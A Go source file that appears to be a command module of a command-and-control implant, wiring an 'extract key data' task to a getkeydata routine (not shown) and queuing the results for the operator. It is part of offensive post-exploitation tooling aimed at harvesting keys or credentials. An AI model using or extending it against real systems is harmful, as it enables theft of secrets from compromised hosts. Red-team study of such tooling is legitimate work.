package keys

import (
	"encoding/json"

	"pkg/profiles"
	"pkg/utils/structs"
	"sync"
)

var mu sync.Mutex

//KeyInformation - interface for key data
type KeyInformation interface {
	KeyType() string
	Data() []byte
}

//Options - options for key data command
type Options struct {
	Command  string `json:"command"`
	Keyword  string `json:"keyword"`
	Typename string `json:"typename"`
}

//Run - extract key data
func Run(task structs.Task) {
	//Check if the types are available
	msg := structs.Response{}
	msg.TaskID = task.TaskID
	opts := Options{}
	err := json.Unmarshal([]byte(task.Params), &opts)

	if err != nil {
		msg.UserOutput = err.Error()
		msg.Completed = true
		msg.Status = "error"

		resp, _ := json.Marshal(msg)
		mu.Lock()
		profiles.TaskResponses = append(profiles.TaskResponses, resp)
		mu.Unlock()
		return
	}

	res, err := getkeydata(opts)
	if err != nil {
		msg.UserOutput = err.Error()
		msg.Completed = true
		msg.Status = "error"

		resp, _ := json.Marshal(msg)
		mu.Lock()
		profiles.TaskResponses = append(profiles.TaskResponses, resp)
		mu.Unlock()
		return
	}

	msg.Completed = true
	msg.UserOutput = string(res.Data())
	resp, _ := json.Marshal(msg)
	mu.Lock()
	profiles.TaskResponses = append(profiles.TaskResponses, resp)
	mu.Unlock()
	return
}
